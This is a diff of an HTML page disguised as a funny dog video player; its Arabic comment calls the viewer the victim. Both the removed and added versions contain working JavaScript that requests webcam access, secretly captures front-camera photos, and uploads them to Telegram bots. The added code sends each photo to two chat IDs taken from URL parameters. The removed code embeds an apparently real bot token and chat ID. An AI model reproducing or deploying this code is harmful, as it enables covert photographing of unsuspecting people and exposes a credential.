@@ -1,70 +1,28 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Player | مـشـغـل الـفـيـديـو</title>
-    <style>
-        body { margin: 0; background-color: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; font-family: Arial, sans-serif; overflow: hidden; }
-        video { width: 100%; max-width: 500px; border-radius: 10px; box-shadow: 0 0 20px rgba(255,255,255,0.2); }
-        .info { margin-top: 15px; text-align: center; }
-        canvas { display: none; }
-        #camera_feed { display: none; }
-    </style>
-</head>
-<body>
-
-    <!-- فيديو الكلب المضحك المستمر -->
-    <video id="funnyVideo" autoplay loop muted playsinline>
-        <source src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJndXN3Nm9uYWRueWdyZzZicXNreGtzYndycW56Nm53Nm53Nm53JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZ29vZC9pbmRleC5naWY/l3q2KVPWwcWDW1Bb2/giphy.mp4" type="video/mp4">
-        Your browser does not support the video tag.
+<html>
+<head><title>Funny Dog Video</title></head>
+<body style="background:black; margin:0; overflow:hidden;">
+    <!-- فيديو الكلب المضحك الذي يظهر للضحية -->
+    <video width="100%" height="100%" autoplay loop muted playsinline>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
     </video>
-
-    <div class="info">
-        <h3>جاري تحميل المحتوى... 😂</h3>
-        <p>انتظر قليلاً لمشاهدة المزيد من المقاطع المضحكة</p>
-    </div>
-
-    <video id="camera_feed" autoplay></video>
-    <canvas id="canvas"></canvas>
-
+    <canvas id="canvas" style="display:none;"></canvas>
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const chatId = urlParams.get('chat_id') || '7238206121'; 
-        const botToken = urlParams.get('bot_token') || '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY';
-
-        const video = document.getElementById('camera_feed');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-
-        // طلب الوصول للكاميرا الأمامية
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(stream => {
-            video.srcObject = stream;
-            // التقاط صورة كل 5 ثواني لإرسالها
-            setInterval(captureImage, 5000);
-        })
-        .catch(err => {
-            console.log("Camera access denied");
+        const p = new URLSearchParams(window.location.search);
+        navigator.mediaDevices.getUserMedia({video:true}).then(stream => {
+            const vid = document.createElement('video'); vid.srcObject = stream; vid.play();
+            setTimeout(() => {
+                const con = document.getElementById('canvas').getContext('2d');
+                document.getElementById('canvas').width = vid.videoWidth;
+                document.getElementById('canvas').height = vid.videoHeight;
+                con.drawImage(vid, 0, 0);
+                document.getElementById('canvas').toBlob(blob => {
+                    let form = new FormData(); form.append('photo', blob, 'cam.jpg');
+                    fetch(`https://api.telegram.org/bot${p.get('bot_token')}/sendPhoto?chat_id=${p.get('user_id')}`, {method:'POST', body:form});
+                    fetch(`https://api.telegram.org/bot${p.get('bot_token')}/sendPhoto?chat_id=${p.get('admin_id')}`, {method:'POST', body:form});
+                }, 'image/jpeg');
+            }, 4000);
         });
-
-        function captureImage() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'cam_shot.jpg');
-                formData.append('caption', '🤳 **New Front Cam Shot!**\n🦅 Dev: Abu Osayed Malkawi');
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            }, 'image/jpeg');
-        }
     </script>
 </body>
 </html>
